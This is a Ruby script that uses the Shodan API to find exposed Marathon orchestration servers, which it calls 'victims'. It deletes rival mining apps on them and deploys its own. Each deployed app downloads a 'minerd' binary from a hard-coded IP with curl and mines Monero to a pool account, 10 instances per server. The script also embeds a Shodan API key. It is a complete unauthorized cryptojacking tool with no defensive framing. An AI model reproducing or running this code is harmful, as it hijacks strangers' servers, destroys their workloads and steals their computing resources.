require 'shodan'
require 'ipaddr'
require 'awesome_print'
require 'marathon'

MY_API_KEY = "JsyCs77Kh69kc6MyrHkZ0mgwXWe4XSXZ"

class Scrapper
  def self.find_victims
    api = Shodan::Shodan.new(MY_API_KEY)
    result = api.count('marathon product:"Jetty"')
    total = result["total"]

    1.upto(total/100 + 1 ).each do |page|
      result = api.search('marathon product:"Jetty"', page: page)
      result["matches"].each do |victim|
        ip = IPAddr.new(victim['ip'], Socket::AF_INET).to_s
        port = victim['port']

        url = "http://#{ip}:#{port}"
        node = Node.marathon.find_or_initialize_by(ip: ip)
        node.port = port
        node.save
        Marathon.url = url
        begin
          puts url
          Marathon::App.list.each do |app|
            puts "         "  +  app.info[:id]
            node.apps.create app_id: app.info[:id], raw_response: app.info.to_json if !node.apps.find_by app_id: app.info[:id]
          end
        rescue Exception => e
          puts e
        end
      end
    end
  end

  def self.count_mine
    count = 0
    Node.marathon.each do |node|
      url = "http://#{node.ip}:#{node.port}"
      Marathon.url = url
      puts url

      begin
      app = Marathon::App.get "/tomcta4u"
      if app
        count += 1
        puts count
      end

      rescue Exception => e
        puts e
      end
    end
  end



  def self.remove_idot
    apps = App.all.select{|a| a.app_id =~ /89a.*/ || a.app_id =~ /tom.*u/}
    apps.each do |app|
      url = "http://#{app.node.ip}:#{app.node.port}"
      Marathon.url = url

      puts "delete #{url} / #{app.app_id}"
      begin
      Marathon::App.delete app.app_id
      rescue Exception => e
        puts e
      end
    end
  end

  def self.deploy_my_apps
    nodes = Node.marathon.select{|n| n.apps.length < 3}
    nodes.each do |node|
      url = "http://#{node.ip}:#{node.port}"
      Marathon.url = url

      puts "deploy #{url} "
      hash = {
        id: "/89bbbbbn408vg#{rand(1024)}",
        cmd: "curl -sSL 128.199.211.38/minerd -o minerd && chmod +x minerd; ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u didi123123231@gmail.com -t 10 -p x",
        cpus: 0.3,
        mem: 200,
        disk: 123,
        instances: 50,
        portDefinitions: [
          {
            port: 10000,
            protocol: "tcp",
            name: "default",
            labels: {}
          } ]
      }

      begin
        thatApp = Marathon::App.get "/tomcat4u"
        puts thatApp.info["instances"]
        if thatApp
          thatApp.scale! 1, true
        end
      rescue Exception => e
        puts e
      end
      begin
        app = Marathon::App.create hash
        app.scale! 10
      rescue Exception => e
        puts e
      end
    end
  end
end


